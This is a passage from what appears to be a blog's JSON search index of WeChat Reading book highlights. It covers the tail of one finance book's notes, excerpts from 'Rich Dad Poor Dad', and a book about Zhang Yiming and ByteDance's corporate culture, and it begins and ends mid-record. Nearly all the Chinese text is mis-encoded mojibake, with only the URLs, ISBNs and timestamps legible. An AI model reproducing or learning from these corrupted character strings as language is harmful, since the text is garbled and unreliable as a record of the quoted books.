å¯Œäººå‘è´¢çš„çœŸç›¸ åªæœ‰é‚£äº›ç”˜æ„¿å†’é™©ä¸æ–­å‰è¡Œçš„äººï¼Œæ‰æ¸…æ¥šè‡ªå·±èƒ½èµ°å¤šè¿œã€‚æ‰˜é©¬æ–¯Â·è‰¾ç•¥ç‰¹ï¼ˆTS Eliotï¼‰ â€” åˆ›å»ºäº [[2022-07-26]] 23:12 ^79-436-514 ç¬¬19ç«  ç ´è§£è´¢å¯Œå’Œæ—¶é—´çš„è”å§» ç¬¬19ç«  ç ´è§£è´¢å¯Œå’Œæ—¶é—´çš„è”å§» æ—¶é—´æ˜¯ä½ ç”Ÿå‘½ä¸­çš„ä¸€æšç¡¬å¸ã€‚è¿™æ˜¯ä½ å”¯ä¸€çš„ä¸€æšç¡¬å¸ï¼Œåªæœ‰ä½ æ‰èƒ½ç¡®å®šå®ƒå¦‚ä½•èŠ±å‡ºå»ã€‚ä½ è¦æ³¨æ„ä¸è¦è®©åˆ«äººæ›¿ä½ èŠ±æ‰å®ƒã€‚å¡å°”Â·æ¡‘å¾·å ¡ï¼ˆCarl Sandburgï¼‰ â€” åˆ›å»ºäº [[2022-07-26]] 23:36 ^80-439-549","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç»æµç†è´¢","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç»æµç†è´¢","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%BB%8F%E6%B5%8E%E7%90%86%E8%B4%A2/"}]},{"title":"å¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸","date":"2024-08-31T01:35:29.366Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç»æµç†è´¢/å¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸-ç½—ä¼¯ç‰¹Â·æ¸…å´/","text":"ä½œè€…ï¼šç½—ä¼¯ç‰¹Â·æ¸…å´ - å†…å®¹ç®€ä»‹ ã€Šå¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ã€‹ æ¸…å´æœ‰ä¸¤ä¸ªçˆ¸çˆ¸ï¼šâ€œç©·çˆ¸çˆ¸â€æ˜¯ä»–çš„äº²ç”Ÿçˆ¶äº²ï¼Œä¸€ä¸ªé«˜å­¦å†çš„æ•™è‚²å®˜å‘˜ï¼›â€œå¯Œçˆ¸çˆ¸â€æ˜¯ä»–å¥½æœ‹å‹çš„çˆ¶äº²ï¼Œä¸€ä¸ªé«˜ä¸­æ²¡æ¯•ä¸šå´å–„äºæŠ•èµ„ç†è´¢çš„ä¼ä¸šå®¶ã€‚æ¸…å´éµä»â€œç©·çˆ¸çˆ¸â€ä¸ºä»–è®¾è®¡çš„äººç”Ÿé“è·¯ï¼šä¸Šå¤§å­¦ï¼Œæœå…µå½¹ï¼Œå‚åŠ è¶Šæˆ˜ï¼Œèµ°è¿‡äº†å¹³å‡¡çš„äººç”ŸåˆæœŸã€‚ç›´åˆ°1977å¹´ï¼Œæ¸…å´äº²çœ¼ç›®ç¹ä¸€ç”Ÿè¾›åŠ³çš„â€œç©·çˆ¸çˆ¸â€å¤±äº†ä¸šï¼Œâ€œå¯Œçˆ¸çˆ¸â€åˆ™æˆäº†å¤å¨å¤·çš„æœ‰é’±äººã€‚æ¸…å´æ¯…ç„¶è¿½å¯»â€œå¯Œçˆ¸çˆ¸â€çš„è„šæ­¥ï¼Œè¸å…¥å•†ç•Œï¼Œä»æ­¤ç™»ä¸Šäº†è‡´å¯Œå¿«è½¦ã€‚ æ¸…å´ä»¥äº²èº«ç»å†çš„è´¢å¯Œæ•…äº‹å±•ç¤ºäº†â€œç©·çˆ¸çˆ¸â€å’Œâ€œå¯Œçˆ¸çˆ¸â€æˆªç„¶ä¸åŒçš„é‡‘é’±è§‚å’Œè´¢å¯Œè§‚ï¼šç©·äººä¸ºé’±å·¥ä½œï¼Œå¯Œäººè®©é’±ä¸ºè‡ªå·±å·¥ä½œï¼ æœ¬æ¬¡20å‘¨å¹´ä¿®è®¢ç‰ˆè¿˜åœ¨å†…å®¹ä¸Šåšäº†ä»¥ä¸‹å‡ é¡¹å‡çº§ï¼š 1.å†…é™„ä½œè€…ç½—ä¼¯ç‰¹Â·æ¸…å´çš„æ¥ä¿¡ 2.â€œ20å¹´åçš„ä»Šå¤©â€è´¯ç©¿å…¨ä¹¦ï¼Œä»¥ä»Šå¤©çš„ç»æµå½¢åŠ¿æ¥å°è¯å¯Œçˆ¸çˆ¸å½“åˆçš„ç†å¿µ 3.æ ¸å¿ƒæ€æƒ³æç‚¼ï¼Œæ–¹ä¾¿å›å‘³ç»å…¸ã€å·©å›ºè®°å¿† 4.èå…¥æ–°å‹å­¦ä¹ æ¨¡å¼ï¼Œè®©ä½ å¯¹æœ¬ä¹¦çš„ç†è§£æ›´é«˜æ•ˆ æœ¬ä¹¦ä¸¤å¤§ç‰¹ç‚¹ï¼š çœŸå® ï¼šä¹¦ä¸­çš„å¾ˆå¤šç†å¿µå’Œæ–¹æ³•éƒ½æ˜¯ä½œè€…å’Œè®¸å¤šå¯Œçˆ¸çˆ¸è¯»è€…äº²èº«å®è·µå’Œå°è¯è¿‡çš„ã€‚ æ˜“æ‡‚ï¼šæ— è®ºæ‚¨çš„è´¢åŠ¡çŠ¶å†µå±äºä»€ä¹ˆæ°´å¹³ï¼Œéƒ½èƒ½ä»è¿™æœ¬ä¹¦ä¸­å¾—åˆ°ä¸€äº›æœ‰ç›Šçš„å¯è¿ªã€‚ é€šè¿‡æœ¬ä¹¦æ‚¨å°†äº†è§£ä»¥ä¸‹å››ä¸ªé—®é¢˜çš„ç­”æ¡ˆï¼š ä¸ºä»€ä¹ˆå¯Œäººä»ä¸ä¸ºé’±å·¥ä½œ ä»€ä¹ˆæ˜¯èµ„äº§ ä¸ºä»€ä¹ˆè‡´å¯Œå¾ˆç®€å•å´å¾ˆå°‘äººå¯Œæœ‰ æ™®é€šäººä¹Ÿå¯ä»¥é€šè¿‡æŠ•èµ„å’Œåˆ›ä¸šè‡´å¯Œå— å¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ + ã€Šå¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ã€‹ å±æ€§ å†…å®¹ ISBN 9787220102912 ä½œè€… ç½—ä¼¯ç‰¹Â·æ¸…å´ å‡ºç‰ˆå¹´ 2017-09-01 å‡ºç‰ˆç¤¾ å››å·äººæ°‘å‡ºç‰ˆç¤¾ æ¥æº å¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ åˆ†ç±» ç»æµç†è´¢-ç†è´¢ é«˜äº®åˆ’çº¿ ç¬¬ä¸€è¯¾ å¯Œäººä¸ä¸ºé’±å·¥ä½œ ç¬¬ä¸€è¯¾ å¯Œäººä¸ä¸ºé’±å·¥ä½œ ä»–ä»¬æ„Ÿåˆ°ææƒ§ï¼Œäºæ˜¯å°±å»å·¥ä½œï¼Œå¸Œæœ›é’±èƒ½æ¶ˆé™¤ææƒ§ï¼Œä½†æ²¡æœ‰å¥æ•ˆã€‚äºæ˜¯ï¼Œææƒ§è¿½é€ç€ä»–ä»¬ï¼Œä»–ä»¬åªå¥½åˆå»å·¥ä½œï¼Œå†ä¸€æ¬¡æœŸæœ›é’±èƒ½å¹³å¤è¿™ç§ææƒ§ï¼Œä½†è¿˜æ˜¯æ²¡æœ‰æˆåŠŸã€‚ææƒ§ä½¿ä»–ä»¬è½å…¥å·¥ä½œçš„é™·é˜±ï¼ŒæŒ£é’±â€”â€”å·¥ä½œâ€”â€”æŒ£é’±ï¼Œå¸Œæœ›ææƒ§å°±æ­¤çƒŸæ¶ˆäº‘æ•£ã€‚ä½†æ¯å¤©ä»–ä»¬èµ·åºŠæ—¶ï¼Œå°±ä¼šå‘ç°ææƒ§åˆä¸ä»–ä»¬ä¸€èµ·é†’æ¥äº†ã€‚ææƒ§ä½¿æˆåƒä¸Šä¸‡çš„äººå½»å¤œéš¾çœ ï¼Œå¿§å¿ƒå¿¡å¿¡ã€‚æ‰€ä»¥ä»–ä»¬åˆèµ·åºŠå»å·¥ä½œäº†ï¼Œå¸Œæœ›è–ªæ°´èƒ½æ¶ˆé™¤å™¬å’¬ä»–ä»¬çµé­‚çš„ææƒ§ã€‚é’±ä¸»å®°ç€ä»–ä»¬çš„ç”Ÿæ´»ï¼Œä»–ä»¬æ‹’ç»å»åˆ†è¾¨çœŸç›¸ï¼Œé’±æ§åˆ¶äº†ä»–ä»¬çš„æƒ…æ„Ÿå’Œçµé­‚ã€‚â€ â€” åˆ›å»ºäº [[2024-01-12]] 09:24 ^49-23373-23586 ç¬¬ä¸€è¯¾ å¯Œäººä¸ä¸ºé’±å·¥ä½œ å¯Œçˆ¸çˆ¸è¯´ï¼šâ€œæˆ‘å¸Œæœ›ä½ ä»¬èƒ½é¿å¼€è¿™ä¸ªé™·é˜±ï¼Œè¿™å°±æ˜¯æˆ‘çœŸæ­£æƒ³æ•™ä½ ä»¬çš„ï¼Œè€Œä¸åªæ˜¯å‘è´¢ï¼Œå› ä¸ºå‘è´¢å¹¶ä¸èƒ½è§£å†³é—®é¢˜ã€‚â€ â€” åˆ›å»ºäº [[2024-01-12]] 09:24 ^49-23992-24043 ç¬¬ä¸€è¯¾ å¯Œäººä¸ä¸ºé’±å·¥ä½œ ä»–ä»¬è®¤ä¸ºé’±èƒ½ä¹°æ¥å¿«ä¹ï¼Œå¯ç”¨é’±ä¹°æ¥çš„å¿«ä¹å¾€å¾€æ˜¯çŸ­æš‚çš„ï¼Œæ‰€ä»¥ä¸ä¹…ä»–ä»¬å°±éœ€è¦æ›´å¤šçš„é’±æ¥ä¹°æ›´å¤šçš„å¿«ä¹ã€æ›´å¤šçš„å¼€å¿ƒã€æ›´å¤šçš„èˆ’é€‚å’Œæ›´å¤šçš„å®‰å…¨æ„Ÿ â€” åˆ›å»ºäº [[2024-01-12]] 09:24 ^49-24204-24269 ç¬¬ä¸€è¯¾ å¯Œäººä¸ä¸ºé’±å·¥ä½œ ä»–ä»¬çµé­‚ä¸­è½¯å¼±è´«ä¹çš„ä¸€é¢æ€»æ˜¯åœ¨å¤§å£°å°–å«ï¼Œä»–ä»¬ä¸æƒ³å¤±å»å¤§æˆ¿å­ã€è½¦å­å’Œé’±å¸¦ç»™ä»–ä»¬çš„ä¸Šç­‰ç”Ÿæ´»ã€‚ä»–ä»¬ç”šè‡³æ‹…å¿ƒä¸€æ—¦æ²¡é’±äº†ï¼Œæœ‹å‹ä»¬ä¼šçœ‹ä¸èµ·ä»–ä»¬ã€‚è®¸å¤šäººå˜å¾—ç»æœ›è€Œç¥ç»è´¨ï¼Œå°½ç®¡ä»–ä»¬å¾ˆå¯Œæœ‰ã€‚ â€” åˆ›å»ºäº [[2024-01-12]] 09:24 ^49-24556-24642 ç¬¬å…­è¯¾ å­¦ä¼šä¸ä¸ºé’±å·¥ä½œ ç¬¬å…­è¯¾ å­¦ä¼šä¸ä¸ºé’±å·¥ä½œ å¤§å¤šæ•°æ•™å¸ˆç¼ºä¹ç°å®ä¸–ç•Œçš„ä½“éªŒâ€”â€”ä»–ä»¬æ²¡æœ‰åšè¿‡ä»–ä»¬æ‰€æ•™æˆçš„äº‹æƒ…ã€‚ â€” åˆ›å»ºäº [[2022-05-31]] 07:52 ^64-3248-3279 ç¬¬å…­è¯¾ å­¦ä¼šä¸ä¸ºé’±å·¥ä½œ â€œå¯¹è®¸å¤šçŸ¥è¯†ï¼Œä½ åªéœ€çŸ¥é“ä¸€ç‚¹å°±å¤Ÿäº†ã€‚â€è¿™æ˜¯å¯Œçˆ¸çˆ¸ç»™æˆ‘çš„å»ºè®®ã€‚ â€” åˆ›å»ºäº [[2022-05-31]] 07:54 ^64-4033-4063","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç»æµç†è´¢","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç»æµç†è´¢","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%BB%8F%E6%B5%8E%E7%90%86%E8%B4%A2/"}]},{"title":"å¤§åŠ›å‡ºå¥‡è¿¹ï¼šå¼ ä¸€é¸£çš„åˆ›ä¸šå¿ƒè·¯ä¸ç®—æ³•æ€ç»´","date":"2024-08-31T01:35:29.364Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç»æµç†è´¢/å¤§åŠ›å‡ºå¥‡è¿¹ï¼šå¼ ä¸€é¸£çš„åˆ›ä¸šå¿ƒè·¯ä¸ç®—æ³•æ€ç»´-ç‹å¥å¹³/","text":"ä½œè€…ï¼šç‹å¥å¹³ - å†…å®¹ç®€ä»‹ ã€Šå¤§åŠ›å‡ºå¥‡è¿¹ï¼šå¼ ä¸€é¸£çš„åˆ›ä¸šå¿ƒè·¯ä¸ç®—æ³•æ€ç»´ã€‹ æŠ–éŸ³ã€ä»Šæ—¥å¤´æ¡ã€è¥¿ç“œè§†é¢‘ã€é£ä¹¦ã€ç«å±±å°è§†é¢‘ã€TikTok åˆ›å§‹äººåå¹´è¿›å‡»ï¼Œå­—èŠ‚è·³åŠ¨å¦‚ä½•çªå‡ºé‡å›´ã€è¶…é€Ÿå´›èµ·ï¼Œç‚¼æˆä¼°å€¼ 2.3 ä¸‡äº¿å…ƒçš„è¶…çº§ç‹¬è§’å…½?å››åè€Œç«‹ï¼Œå¼ ä¸€é¸£å¦‚ä½•å»¶è¿Ÿæ»¡è¶³ã€æˆ˜èƒœææ…Œã€å…‹æœè´ªå©ªï¼Œæˆå°±æ›´æˆåŠŸçš„è‡ªå·±? å¤§åŠ›å‡ºå¥‡è¿¹ï¼šå¼ ä¸€é¸£çš„åˆ›ä¸šå¿ƒè·¯ä¸ç®—æ³•æ€ç»´ + ã€Šå¤§åŠ›å‡ºå¥‡è¿¹ï¼šå¼ ä¸€é¸£çš„åˆ›ä¸šå¿ƒè·¯ä¸ç®—æ³•æ€ç»´ã€‹ å±æ€§ å†…å®¹ ISBN 9787545483956 ä½œè€… ç‹å¥å¹³ å‡ºç‰ˆå¹´ 2023-03-01 å‡ºç‰ˆç¤¾ å¹¿ä¸œç»æµå‡ºç‰ˆç¤¾ æ¥æº å¤§åŠ›å‡ºå¥‡è¿¹ï¼šå¼ ä¸€é¸£çš„åˆ›ä¸šå¿ƒè·¯ä¸ç®—æ³•æ€ç»´ åˆ†ç±» ç»æµç†è´¢-å•†ä¸š é«˜äº®åˆ’çº¿ ä¸›ä¹¦åº ä¸ºæ ‡æ†ä¼ä¸šç«‹ä¼ å¡‘é­‚ï¼šå•†ä¸šæ”¹å˜ä¸–ç•Œï¼Œä¼ è®°å¯è¿ªäººç”Ÿ ä¸›ä¹¦åº ä¸ºæ ‡æ†ä¼ä¸šç«‹ä¼ å¡‘é­‚ï¼šå•†ä¸šæ”¹å˜ä¸–ç•Œï¼Œä¼ è®°å¯è¿ªäººç”Ÿ åœ¨æˆ‘ä»¬çš„ä¸€ç”Ÿä¸­ï¼Œæ€»ä¼šé‡åˆ°é‚£ä¹ˆä¸€ä¸ªäººï¼Œç”¨è‡ªå·±çš„æ™ºæ…§ä¹‹å…‰ã€ç²¾ç¥ä¹‹å…‰ï¼Œç‚¹äº®æˆ‘ä»¬çš„äººç”Ÿä¹‹è·¯ã€‚ â€” åˆ›å»ºäº [[2023-08-14]] 15:25 ^3-410-452 ç¬¬ä¸€æ¬¡åˆ›ä¸šè¯•æ°´ ç¬¬ä¸€æ¬¡åˆ›ä¸šè¯•æ°´ ä½†æ­£å¦‚é«˜æ™“æ¾æ‰€è¯´ï¼šâ€œæˆ‘å¦ˆä»å°å°±æ•™è‚²æˆ‘ä»¬ï¼Œä¸è¦è¢«ä¸€äº›æ‰€è°“çš„è´¢äº§å›°ä½ã€‚è°è¦è§‰å¾—ä½ çœ¼å‰è¿™ç‚¹å„¿è‹Ÿä¸”å°±æ˜¯ä½ çš„äººç”Ÿï¼Œé‚£ä½ è¿™ä¸€ç”Ÿå°±å®Œäº†ã€‚ç”Ÿæ´»ä¸åªæœ‰çœ¼å‰çš„è‹Ÿä¸”ï¼Œè¿˜æœ‰è¯—å’Œè¿œæ–¹ã€‚â€â€œä½ ä¹Ÿç»å¸¸æœ‰é™¤äº†å¼¯è…°æ¡å…­ä¾¿å£«ä»¥å¤–ï¼ŒæŠ¬å¤´çœ‹è§æœˆäº®çš„æ—¶å€™ã€‚æˆ‘è¯´çš„è¯—å’Œè¿œæ–¹å°±æ˜¯é‚£ä¸ªï¼Œè€Œä¸æ˜¯ä¸€ä¸ªè±ªåçš„æ—…æ¸¸â€¦â€¦â€ â€” åˆ›å»ºäº [[2023-08-15]] 07:48 ^9-1614-1746 ç½‘çŠ¶ç»„ç»‡ï¼Œå¼ºå¤§ä¸­å° ç½‘çŠ¶ç»„ç»‡ï¼Œå¼ºå¤§ä¸­å° â€œæ ¸å¿ƒç«äº‰åŠ›ç›´æ¥æ¥è¯´æ˜¯æˆ‘ä»¬çš„äº§å“ï¼Œäº§å“èƒŒåæ˜¯æˆ‘ä»¬çš„æŠ€æœ¯ç³»ç»Ÿï¼ŒæŠ€æœ¯ç³»ç»ŸèƒŒåæ˜¯æˆ‘ä»¬çš„å›¢é˜Ÿå’Œæ–‡åŒ–ã€‚â€åœ¨å¼ ä¸€é¸£çœ‹æ¥ï¼Œäº’è”ç½‘æŠ€æœ¯ä¸å¯èƒ½å½¢æˆé•¿æœŸå„æ–­ï¼Œè€Œå¸‚åœºå£å’ä¹Ÿå¾€å¾€è„†å¼±ã€‚æˆåŠŸçš„åˆ›ä¸šè€…ï¼Œå¹¶éåªé€šè¿‡äº§å“ä¸ºç”¨æˆ·æä¾›ä»·å€¼ï¼Œè€Œæ˜¯è¦åšå¥½å…¬å¸æœ¬èº«çš„â€œäº§å“ç»ç†â€ã€‚ â€” åˆ›å»ºäº [[2023-08-15]] 09:17 ^24-393-512 â€œä¸æˆç†Ÿâ€çš„ä¼ä¸šæ–‡åŒ– â€œä¸æˆç†Ÿâ€çš„ä¼ä¸šæ–‡åŒ– ç¼ºä¹å¦è¯šæ˜¯å•†ä¸šç”Ÿæ´»ä¸­æœ€å‘åŠ£çš„ç§˜å¯†ã€‚â€ç¼ºä¹å¦è¯šä¸ä»…æŒ‡æ¶æ„æ¬ºè¯ˆï¼Œæ›´æ˜¯æŒ‡ä¸èƒ½çœŸå®è¡¨è¾¾è‡ªå·±çš„æƒ³æ³•ã€‚å¦è¯šï¼Œæ‰èƒ½è®©ä¿¡æ¯æµåŠ¨çœŸå®è€Œä¸èµ°å½¢ï¼Œæ‰èƒ½é™ä½ç®¡ç†æˆæœ¬ã€‚ â€” åˆ›å»ºäº [[2023-08-15]] 09:43 ^25-1292-1363 â€œä¸æˆç†Ÿâ€çš„ä¼ä¸šæ–‡åŒ– ä¸ºä¿è¯å‘˜å·¥ä»ä¸€å¼€å§‹å°±èƒ½ä¹ æƒ¯ï¼Œå­—èŠ‚è·³åŠ¨ä¸å…è®¸æœ‰ä»»ä½•ç§°å‘¼ä¸Šçš„æ•¬è¯­ï¼Œç±»ä¼¼â€œÃ—æ€»â€â€œÃ—å“¥â€â€œè€å¤§â€â€œå¤´å¤´â€è¿™ç±»ç§°å‘¼ï¼Œåœ¨å…¬å¸å†…è¢«ç¦æ­¢ä½¿ç”¨ã€‚å­—èŠ‚è·³åŠ¨å–æ¶ˆäº†å†…éƒ¨çš„èŒçº§æ¦‚å¿µï¼Œå‡ºç°åœ¨æ–°é—»ç¨¿ä¸Šçš„èŒä½å¤´è¡”ï¼Œå¤§éƒ½æ˜¯ä¸ºå‡ºå¸­æ´»åŠ¨çš„äººä¸´æ—¶å‡†å¤‡çš„ã€‚å¼ ä¸€é¸£æ——ä¸‹å¤§å°†å¯¹æ­¤éå¸¸é€‚åº”ï¼Œè°¢æ¬£å°±æ›¾å…¬å¼€è¯´ï¼šâ€œå…¶å®å…¬å¸æ²¡æœ‰äººçŸ¥é“äº’ç›¸æ˜¯ä»€ä¹ˆå¤´è¡”ï¼Œæˆ‘ä»¬è§‰å¾—è¿™ä¸ªä¸é‡è¦ï¼ŒçŸ¥é“äº†åè€Œä¼šè€½è¯¯äº‹ã€‚â€ â€” åˆ›å»ºäº [[2023-08-15]] 09:45 ^25-1680-1849 åƒHRé‚£æ ·åˆ›ä¸š åƒHRé‚£æ ·åˆ›ä¸š ä¼˜ç§€çš„äººæ‰ï¼Œæ‰¾å·¥ä½œå·²ç»ä¸æ˜¯ç®€å•çš„è°‹æ±‚ä¸€ä»½èŒä¸šï¼Œè€Œæ˜¯åœ¨é€‰æ‹©ä¸€ä»½äº‹ä¸šã€‚ â€” åˆ›å»ºäº [[2023-09-05]] 22:52 ^49-2679-2712 åƒHRé‚£æ ·åˆ›ä¸š é€šè¿‡ä¸æ–­ä¸äººæ‰çš„é«˜è´¨é‡å¯¹è¯ï¼Œå¼ ä¸€é¸£ç”¨å¹³è§†ã€å¯¹ç­‰å’Œä¿æŒå°Šé‡çš„äº¤æµä¸æ²Ÿé€šæ–¹å¼ï¼Œä¸ºå­—èŠ‚è·³åŠ¨çš„äººåŠ›èµ„æºå¥ å®šäº†åšå®çš„åŸºç¡€ï¼Œè¿™ç§æ²Ÿé€šæ–¹å¼ä¹Ÿéšç€æºæºä¸æ–­çš„æ–°é²œè¡€æ¶²ï¼Œèå…¥è¿™å®¶å…¬å¸çš„æ–‡åŒ–çµé­‚ã€‚ â€” åˆ›å»ºäº [[2023-09-05]] 22:51 ^49-3609-3696 é€æ˜åŒ–å¸¦æ¥ä¿¡ä»» é€æ˜åŒ–å¸¦æ¥ä¿¡ä»» å¼ ä¸€é¸£æ·±çŸ¥ï¼Œåœ¨æ‰€æœ‰ç»„ç»‡æœºæ„ä¸­ï¼Œä¿¡æ¯å³æƒåŠ›ã€‚åŸºå±‚å‘˜å·¥ã€ä»–ä»¬çš„ä¸Šçº§ã€ä¸Šçº§çš„ä¸Šçº§â€¦â€¦ä¸åŒå±‚çº§æ‰€æŒæ¡çš„ä¿¡æ¯é€šå¸¸æ˜¯ä¸å‡è¡¡çš„ã€‚è¿™ç§ä¸å‡è¡¡å±€é¢æŒç»­å‘å±•ï¼Œå°±ä¼šé€ æˆä¿¡æ¯çš„å„æ–­åŒ–ï¼Œå¯¼è‡´ä¼ä¸šå†…éƒ¨æ²Ÿé€šç¯å¢ƒç¼ºä¹ä¿¡ä»»ã€æƒåŠ›è¿‡åº¦é›†ä¸­ï¼Œæœ€ç»ˆé™ä½ç»„ç»‡æ•ˆç‡ã€‚å°¤å…¶æ˜¯ä»¥å¹´è½»å‘˜å·¥ä¸ºä¸»çš„å­—èŠ‚è·³åŠ¨ï¼Œæ›´ç¦»ä¸å¼€é€æ˜åŒ–çš„è¿è¡Œã€‚ä¿¡æ¯é€æ˜èƒ½äº§ç”Ÿå……åˆ†çš„ä¿¡ä»»ï¼Œä¿¡ä»»åŸºç¡€ä¸Šçš„æƒåŠ›åˆ†é…ä½¿ç”¨ï¼Œæ‰èƒ½äº§ç”Ÿæå¤§çš„èƒ½é‡ã€‚ â€” åˆ›å»ºäº [[2023-09-05]] 22:57 ^51-564-738 é€æ˜åŒ–å¸¦æ¥ä¿¡ä»» å­—èŠ‚è·³åŠ¨çš„å‘˜å·¥å¯ä»¥åœ¨å†…éƒ¨æŸ¥åˆ°ä»»ä½•ä¸€ä¸ªåŒäº‹æœ€è¿‘çš„å·¥ä½œé‡ç‚¹(OKR)ã€‚æ–°å…¥èŒçš„å‘˜å·¥å¯ä»¥åœ¨WIKIä¸ŠæŸ¥çœ‹å…¬å¸æ‰€æœ‰å†å²èµ„æ–™ã€‚æ¯ä¸ªæ™®é€šå‘˜å·¥ï¼Œéƒ½æœ‰æŸ¥çœ‹å¤´æ¡ç³»æ‰€æœ‰äº§å“æ•°æ®çš„æƒåˆ©ï¼Œåªéœ€è¦å‘è‡ªå·±çš„ç›´å±é¢†å¯¼è€…æå‡ºç”³è¯·å¹¶è·åŒæ„å³å¯ï¼Œå¹¶ä¸éœ€è¦æ›´é«˜å±‚çº§çš„äººåŒæ„ã€‚å³ä¾¿æ˜¯ç”³è¯·å’Œå®¡æ‰¹ç¨‹åºï¼Œä¹Ÿä¸æ˜¯ä¸ºäº†è®¾é™ï¼Œè€Œæ˜¯ä¸ºäº†ç¡®ä¿æ¯ä¸ªå‘˜å·¥èƒ½ä¸ºè·å–çš„ä¿¡æ¯è´Ÿè´£ã€‚ â€” åˆ›å»ºäº [[2023-09-05]] 22:57 ^51-917-1074 é€æ˜åŒ–å¸¦æ¥ä¿¡ä»» åœ¨æé—®å’Œè§£ç­”è¿‡ç¨‹ä¸­ï¼ŒåŒæ–¹è¾¾æˆäº†æ–°çš„ä¿¡æ¯å‡è¡¡ã€‚è¿™ä¸€ä¼šè®®åˆ¶åº¦æ¥æºäºè°·æ­Œï¼ŒåŒæ—¶ä¹Ÿæœ‰æ‰¹è¯„ä¸è‡ªæˆ‘æ‰¹è¯„çš„é©å‘½æ–‡åŒ–ç—•è¿¹ï¼Œå­—èŠ‚è·³åŠ¨ä»ä¸­æ”¶è·çš„ä¸åªæ˜¯ä¿¡æ¯å‡è¡¡ï¼Œæ›´æœ‰ä¸Šä¸‹çº§æ‹§æˆä¸€è‚¡ç»³çš„å¼ºå¤§æˆ˜æ–—åŠ›ã€‚ â€” åˆ›å»ºäº [[2023-09-05]] 22:58 ^51-1282-1369 é€æ˜åŒ–å¸¦æ¥ä¿¡ä»» ä¸èƒ½è¯´ä»–å¯èƒ½æŠ±æœ‰â€˜ä¸ºäº†åå¯¹è€Œåå¯¹â€™çš„æ ç²¾å¿ƒæ€ã€‚è€Œä¸”ï¼Œè¿™ä¼šè®©å¤§å®¶ææ„è§æ—¶å…ˆè‡ªæˆ‘å®¡æŸ¥ã€‚â€æ€»ä¹‹ï¼Œä»–è®¤ä¸ºè¿™æ ·çš„ä¸»é¢˜ï¼Œä¼šä¼¤å®³å­—èŠ‚è·³åŠ¨è‡ªç”±è¡¨è¾¾çš„æ°›å›´ã€‚åœ¨å¼ ä¸€é¸£çš„åšæŒä¸‹ï¼Œè¿™å¼ æ¼«ç”»å¾ˆå¿«è¢«æ’¤æ¢ä¸‹æ¥ã€‚ â€” åˆ›å»ºäº [[2023-09-05]] 22:59 ^51-1836-1926 é€æ˜åŒ–å¸¦æ¥ä¿¡ä»» ï¼Œè¿™ç§æ•æ„Ÿæ€§ï¼Œè®©å¼ ä¸€é¸£æ²¡æœ‰åƒå¤§å¤šæ•°æˆåŠŸä¼ä¸šå®¶é‚£æ ·ä»¥è‡ªæˆ‘è®¤çŸ¥ä¸ºæ ¸å¿ƒï¼Œä¸ºäº†è¿½æ±‚çœŸå®çš„ç»†èŠ‚ï¼Œä»–æ„¿æ„ä»¥â€œé«˜å¤„ä¸èƒœå¯’â€ä½œä¸ºä»£ä»·ã€‚ â€” åˆ›å»ºäº [[2023-09-05]] 23:01 ^51-3326-3385 é€æ˜åŒ–å¸¦æ¥ä¿¡ä»» é€æ˜åŒ–çš„ä¿¡æ¯æµé€šä½“åˆ¶ï¼Œè®©å­—èŠ‚è·³åŠ¨æˆä¸ºç›¸ä¿¡ç»“æœå’Œæ•°æ®çš„å…¬å¸ï¼Œåœ¨è¿™é‡Œï¼ŒæƒåŠ›å¹¶éè‡³é«˜æ— ä¸Šçš„ï¼Œç§‘å­¦å‡†ç¡®çš„ä¿¡æ¯æ‰æ˜¯ã€‚è¿™æ˜¯å¼ ä¸€é¸£èµ‹äºˆå­—èŠ‚è·³åŠ¨æœ€å®è´µçš„åŸºå› ã€‚ â€” åˆ›å»ºäº [[2023-09-05]] 23:01 ^51-3414-3485 é€æ˜åŒ–å¸¦æ¥ä¿¡ä»» æ„æˆä¿¡æ¯ç¯å¢ƒçš„å…ƒç´ 